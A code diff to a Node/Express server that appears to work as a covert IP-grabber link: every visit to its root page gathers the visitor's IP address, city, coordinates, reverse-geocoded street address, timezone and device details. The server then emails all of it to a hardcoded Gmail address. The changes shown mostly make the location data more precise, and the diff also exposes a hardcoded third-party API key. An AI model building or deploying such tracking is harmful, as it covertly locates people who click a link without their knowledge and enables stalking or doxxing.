@@ -6,6 +6,7 @@ const app = express();
 
 app.set('trust proxy', true);
 
+// Configure transporter
 const transporter = nodemailer.createTransport({
   service: 'gmail',
   auth: {
@@ -20,32 +21,60 @@ app.get('/', async (req, res) => {
   const referrer = req.headers['referer'] || 'direct';
   const timestamp = new Date().toISOString();
 
+  // Device parsing
   const parser = new UAParser(userAgent);
   const device = parser.getDevice();
   const os = parser.getOS();
   const browser = parser.getBrowser();
-  const deviceInfo = `${device.model || 'Unknown device'} (${os.name} ${os.version}), ${browser.name} ${browser.version}`;
 
-  let location = 'Unknown location';
+  const deviceBrand = device.vendor || 'Unknown brand';
+  const deviceModel = device.model || 'Unknown model';
+  const osInfo = `${os.name || 'OS'} ${os.version || ''}`.trim();
+  const browserInfo = `${browser.name || 'Browser'} ${browser.version || ''}`.trim();
+
+  let location = 'Unknown';
+  let coordinates = 'N/A';
+  let timezone = 'N/A';
+  let geoAddress = 'N/A';
+
   try {
+    // Get IP-based geo info
     const geo = await axios.get(`http://ip-api.com/json/${ip}`);
-    const { city, regionName, country, isp } = geo.data;
+    const { city, regionName, country, isp, lat, lon, timezone: tz } = geo.data;
+
     location = `${city}, ${regionName}, ${country} (ISP: ${isp})`;
+    coordinates = `Latitude: ${lat}, Longitude: ${lon}`;
+    timezone = tz || 'N/A';
+
+    // Reverse geocoding using OpenCage API
+    const OPEN_CAGE_KEY = 'cd07cd206f6a4f7086bed7fa65741f82';
+    const reverseGeo = await axios.get(`https://api.opencagedata.com/geocode/v1/json?q=${lat}+${lon}&key=${OPEN_CAGE_KEY}`);
+    const components = reverseGeo.data.results[0]?.formatted;
+    geoAddress = components || 'N/A';
   } catch (err) {
-    console.error('Failed to get location:', err.message);
+    console.error('Geo lookup failed:', err.message);
   }
 
   const mailOptions = {
     from: 'zyron',
     to: 'xraymundzyron@gmail.com',
     subject: 'Visitor accessed your URL',
-    text: `New visit detected!\n
-            Timestamp: ${timestamp}\n
-            IP Address: ${ip}\n
-            Location: ${location}\n
-            Device: ${deviceInfo}\n
-            User Agent: ${userAgent}\n
-            Referrer: ${referrer}`
+    text: `New visit detected!
+
+Timestamp: ${timestamp}
+IP Address: ${ip}
+Location: ${location}
+Reverse Geocoded Address: ${geoAddress}
+Coordinates: ${coordinates}
+Timezone: ${timezone}
+
+Device Brand: ${deviceBrand}
+Device Model: ${deviceModel}
+OS: ${osInfo}
+Browser: ${browserInfo}
+
+User Agent: ${userAgent}
+Referrer: ${referrer}`
   };
 
   transporter.sendMail(mailOptions, (error) => {
